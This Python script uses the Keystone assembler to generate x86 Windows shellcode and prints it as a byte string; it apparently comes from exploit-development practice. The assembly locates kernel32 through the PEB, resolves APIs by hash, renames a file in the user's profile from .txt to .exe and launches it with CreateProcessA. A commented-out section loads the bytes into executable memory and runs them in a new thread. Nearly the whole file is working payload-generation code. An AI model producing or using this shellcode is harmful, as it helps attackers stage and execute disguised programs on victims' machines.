import sys
import argparse
import ctypes, struct, numpy
import keystone as ks


def to_hex(s):
    retval = list()
    for char in s:
        retval.append(hex(ord(char)).replace("0x", ""))
    return "".join(retval)


def to_sin_ip(ip_address):
    ip_addr_hex = []
    for block in ip_address.split("."):
        ip_addr_hex.append(format(int(block), "02x"))
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def to_sin_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])


def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return (int(binb, 2))


def push_function_hash(function_name):
    edx = 0x00
    ror_count = 0
    for eax in function_name:
        edx = edx + ord(eax)
        if ror_count < len(function_name)-1:
            edx = ror_str(edx, 0xd)
        ror_count += 1
    return ("push " + hex(edx))


def push_string(input_string):
    rev_hex_payload = str(to_hex(input_string))
    rev_hex_payload_len = len(rev_hex_payload)

    instructions = []
    first_instructions = []
    null_terminated = False
    for i in range(rev_hex_payload_len, 0, -1):
        # add every 4 byte (8 chars) to one push statement
        if ((i != 0) and ((i % 8) == 0)):
            target_bytes = rev_hex_payload[i-8:i]
            instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
        # handle the left ofer instructions
        elif ((0 == i-1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0):
            if (rev_hex_payload_len % 8 == 2):
                first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
                first_instructions.append("push eax;")
            elif (rev_hex_payload_len % 8 == 4):
                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                first_instructions.append("push eax;")
            else:
                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
                first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                first_instructions.append("push eax;")
                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                first_instructions.append("push ax;")
            null_terminated = True

    instructions = first_instructions + instructions
    asm_instructions = "".join(instructions)
    return asm_instructions

def copy_file_shellcode():
    push_instr_terminate_hash = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_createprocessa_hash = push_function_hash("CreateProcessA")
    push_instr_move_file_a_hash = push_function_hash("MoveFileA")
    push_instr_userenv = push_string("userenv.dll")

    push_instr_terminate_hash = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_GetUserProfileDirectoryW_hash = push_function_hash("GetUserProfileDirectoryW")
    push_instr_GetUserProfileDirectoryA_hash = push_function_hash("GetUserProfileDirectoryA")
    push_instr_Get_current_process_ID = push_function_hash("GetCurrentProcessId")
    push_instr__open_process = push_function_hash("OpenProcess")
    push_instr__open_process_token = push_function_hash("OpenProcessToken")
    push_instr__close_process_handle = push_function_hash("CloseHandle")


    asm = [
        "   start:                               ",
        "       mov ebp, esp                    ;",  #
        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;",  # ECX = 0
        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
        "   next_module:                         ",
        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
        "       jne next_module                 ;",  # No: try next module.
        "   find_function_shorten:               ",
        "       jmp find_function_shorten_bnc   ;",  # Short jump
        "   find_function_ret:                   ",
        "       pop esi                         ;",  # POP the return address from the stack
        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
        "       jmp resolve_symbols_kernel32    ;",  #
        "   find_function_shorten_bnc:           ",
        "       call find_function_ret          ;",  # Relative CALL with negative offset
        "   find_function:                       ",
        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
        "       add edi, ebx                    ;",  # Export Table Directory VMA
        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
        "       add eax, ebx                    ;",  # AddressOfNames VMA
        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
        "   find_function_loop:                  ",
        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
        "       dec ecx                         ;",  # Decrement our names counter
        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
        "   compute_hash:                        ",
        "       xor eax, eax                    ;",  # NULL EAX
        "       cdq                             ;",  # NULL EDX
        "       cld                             ;",  # Clear direction
        "   compute_hash_again:                  ",
        "       lodsb                           ;",  # Load the next byte from esi into al
        "       test al, al                     ;",  # Check for NULL terminator
        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
        "       add edx, eax                    ;",  # Add the new byte to the accumulator
        "       jmp compute_hash_again          ;",  # Next iteration
        "   compute_hash_finished:               ",
        "   find_function_compare:               ",
        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
        "       add eax, ebx                    ;",  # Get the function VMA
        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
        "   find_function_finished:              ",
        "       popad                           ;",  # Restore registers
        "       ret                             ;",  #
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,                   # TerminateProcess hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess address for later
        push_instr_loadlibrarya_hash,                # LoadLibraryA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
        push_instr_createprocessa_hash,              # CreateProcessA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA address for later
        push_instr_move_file_a_hash,            #move fileA hash
        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
        "       mov [ebp+0x1c], eax             ;",  # Save MoveFileA for later 
        push_instr_Get_current_process_ID,
        "      call dword ptr [ebp+0x04];        ",  #Call find_function
        "      mov [ebp+0x20], eax;              ",  #Save get_current_pid for later
        push_instr__open_process,
        "       call dword ptr [ebp+0x04];      ",  #Call find_function
        "       mov [ebp+0x24], eax;            ",  #Save open_process for later
        push_instr__close_process_handle,   
        "       call dword ptr [ebp+0x04];      ",  #Call find_function
        "       mov [ebp+0x28], eax             ;",  #Save open_process for later
                
        "   load_kernel_base_dll:"
        "       xor eax, eax ;              ",# zero out eax
        "       mov ax, 0x6c6c              ;", # ensure nullbyte
        "       push eax ;                  ",# end of string 'll' with nullbyte
        "       push 0x642e6573             ;", # push 'se.d' onto stack
        "       push 0x61626c65             ;", # push 'elba' onto stack
        "       push 0x6e72656b ;           ",# push 'kern' onto stack
        "       push esp                            ;",
        "       call dword ptr [ebp+0x14]               ;",
       "    resolve_symbols_kernelbase:       ",
       "        mov ebx, eax;                  ",
        push_instr__open_process_token,
        "       call dword ptr [ebp+0x04];      ",  #Call find_function
        "       mov [ebp+0x2c], eax     ;        ",  #Save open_process token for later
        "   load_Userenv_dll:                          ",
        "       xor eax, eax                           ;",
        "       push eax                               ;",
        push_instr_userenv,
        "       push esp                                ;", #ptr to userenv.dll
        "       call dword ptr [ebp+0x14]               ;",  # Call LoadLibraryA
        "   resolve_symbols_user_env:                   ",
        "       mov ebx, eax                            ;",      
        push_instr_GetUserProfileDirectoryA_hash,  
        "       call dword ptr [ebp+0x04]               ;",  # Call find_function
        "       mov [ebp+0x30], eax                     ;", #save get_user_directory_profileA address
        "   call_get_pid:                               ",
        "      call dword ptr [ebp+0x20]                 ;", # call get pid
        "       mov esi, eax                            ;" , #save current pid to esi
        "   call_open_process:                           ",
        "       push esi                              ;", #current process id as dWProcess Id
        "       xor eax, eax                        ;",
        "       push eax                            ;", # 0 for bInherithandle
        "       mov eax, 0x001FFFFF                     ;", # all accessssssss
        "       push eax                            ;",# dW desired access query limited information 
        "       call dword ptr [ebp+0x24]           ;" , # call open process
        "       mov edi, eax                        ;", #edi holds handle of curr_process
        "   call_open_process_token:                ",
        "       sub esp, 0x4                        ;",
        "       mov ebx, esp                        ;", #ebx holds token(will ret from this func)
        "       push ebx                            ;", #Token handle ptr
        "       push 0xF01FF                        ;", #all access
        "       push edi                            ;", #curr process ID
        "       call dword ptr [ebp+0x2c]           ;", # I will get back token to whatevrs pointed to by ebx
        "    call_get_user_Profile_directoryA:", #
        "       sub esp, 0x1200                     ;",
        "       xor eax, eax                        ;",# EAX = 0
        "       mov ecx, 0x98                       ;",# 0x260 / 4 = 152 dwords
        "       mov esi, esp                        ;",
        "       mov edi, esi                        ;",# EDI also points to the buffer
        "       rep stosd                           ;",# Zero out the allocated space
        "       push esi                            ;",
        "       push esp                            ;",
        "       sub edi, 0x260                      ;",
        "       push edi                            ;", #this holds my userprofiledir.
        "       push dword ptr [ebx]                ;",# Push token handle        
        "       call dword ptr [ebp+0x30]           ;",# Call GetUserProfileDirectoryA, 
        # get user profile dir A will get back something in edi
        "   call_move_file_A:                       ",
        "       add esp, 0x200                      ;",
        "       xor eax, eax                        ;", # zero out eax
        "       push eax                            ;", # ensure null byte
        "       push 0x657865                       ;", # push 'exe' onto stack   
        "       push 0x2e657461                     ;", # push 'ate.' onto stack
        "       push 0x6572635c                     ;", # push '\cre' onto stack
        "       push 0x7265646c                     ;", # push 'lder' onto stack
        "       push 0x6f665f6d                     ;", # push 'm_fo' onto stack
        "       push 0x6f72665c                     ;", # push '\fro' onto stack
        "       push 0x706f746b                     ;", # push 'ktop' onto stack
        "       push 0x7365445c                     ;", # push '\Des' onto stack
        "       push 0x6168615c                     ;", # push '\aha' onto stack
        "       push 0x73726573                     ;", # push 'sers' onto stack
        "       push 0x555c3a43                     ;", # push 'C:\U' onto stack
        "       push esp                            ;",
        "       xor eax, eax                       ; ",# zero out eax
        "       mov esi, edi                        ;", #edi and esi hold get user profiledirA path
        "       xor al, al                          ;",
        "       mov ecx, 0xFFFFFFFF                 ;",
        "       repne scasb                         ;",
        "       dec edi                             ;",
        "       mov eax , 0x6273615c                ;",# load \asb into eax
        "       mov [edi], eax                      ;", #write met after whatever user path
        "       mov dword ptr [edi+0x4], 0x6578652e ;", # write.txt after \met or .exe
        "       xor eax, eax                        ;",
        "       mov byte ptr [edi+0x8], al          ;", #mov null term
        #strcpy 
        #; Assuming the source string is pointed to by esi
        "       lea edi, [ebp+0x200]    ;",# Destination
        "       cld                     ;",# Clear direction flag 

        "copy_loop:                 ",
        "    lodsb                   ;",# Load byte from [esi] into al and increment esi
        "    stosb                   ;",# Store byte from al to [edi] and increment edi
        "    test al, al             ;",# Check if we've hit the null terminator
        "    jnz copy_loop           ;",# If not null, continue loop

        # append the move file a path here.
        "       pop esi                             ;"
        #"       push eax                            ;", #lpnewFileName -> c:\Users\aha\asb.exe
        "       lea edi, [ebp+0x200]    ;",# Destination
        #"       push ebp+0x200                    ;",
        "       push edi                           ;",#lpnewFileName -> c:\Users\aha\asb.exe
        "       push esi                            ;",#lpexistingfileName -> c:\Users...\asb.txt
    
        "       call [ebp+0x1c]                     ;", # call move file a
        #rets boolean - result directory stored in [esi]

        #
    "       create_startup_info_process_info_process:                   ;",
    "           mov edi, ebp                ;",
    "           add edi, 0x38               ;", #; Start of STARTUPINFO
    "           xor eax, eax                ;",
    "           mov ecx, 21                 ;",     #; (68 + 16) / 4 = 21 DWORDs
    "           rep stosd                   ;",

   # ; Set cb member of STARTUPINFO
   "        mov esp, ebp            ;",
    "       mov dword ptr [ebp+0x38], 68        ;",# First DWORD of STARTUPINFO is cb

    #; Call CreateProcessA
    "       lea eax, [ebp+0x7C]   ;",# Address of PROCESS_INFORMATION
    "       push eax              ;",# 
    "       lea eax, [ebp+0x38]   ;",# Address of STARTUPINFO
    "       push eax              ;",#
    "       xor eax, eax          ;",#
    "       push eax              ;",# lpCurrentDirectory (NULL)
    "       push eax              ;",# lpEnvironment (NULL)
    "       push eax              ;",# dwCreationFlags (0)
    "       push eax              ;",# bInheritHandles (FALSE)
    "       push eax              ;",# lpThreadAttributes (NULL)
    "       push eax              ;",# lpProcessAttributes (NULL)
    "       push eax              ;",# lpCommandLine (NULL)
    "       lea eax, [ebp+0x200]    ;",# Destination store of my string.
    "       push eax              ;",# lpApplicationName (path)
    "       call dword ptr [ebp+0x18]           ;",


        "   exec_shellcode:                            ",
        "       xor ecx, ecx;                           ",
        "       push ecx;                               ", #uExitcode
        "       push 0xffffffff;                        ",#hprocess
        "       call dword ptr[ebp+0x10];               ",# call TerminateProcess
    ]
    return "\n".join(asm)

shellcode = copy_file_shellcode()
eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
encoding, count = eng.asm(shellcode)
final = ""
final += 'shellcode = b"'
for enc in encoding:
    final += "\\x{0:02x}".format(enc) 


print(final)
print(f"\n[+] Debugging shellcode ...")


# sh = b""
# for e in encoding:
#     sh += struct.pack("B", e)
# packed_shellcode = bytearray(sh)
# ptr = ctypes.windll.kernel32.VirtualAlloc(
#     ctypes.c_int(0),
#     ctypes.c_int(len(packed_shellcode)+0x1000),
#     ctypes.c_int(0x3000),
#     ctypes.c_int(0x40),
# )
# buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
# ctypes.windll.kernel32.RtlMoveMemory(
#     ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
# )
# print("[=]   Shellcode located at address %s" % hex(ptr))
# input("...ENTER TO EXECUTE SHELLCODE...")
# ht = ctypes.windll.kernel32.CreateThread(
#     ctypes.c_int(0),
#     ctypes.c_int(0),
#     ctypes.c_int(ptr),
#     ctypes.c_int(0),
#     ctypes.c_int(0),
#     ctypes.pointer(ctypes.c_int(0)),
# )
# ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


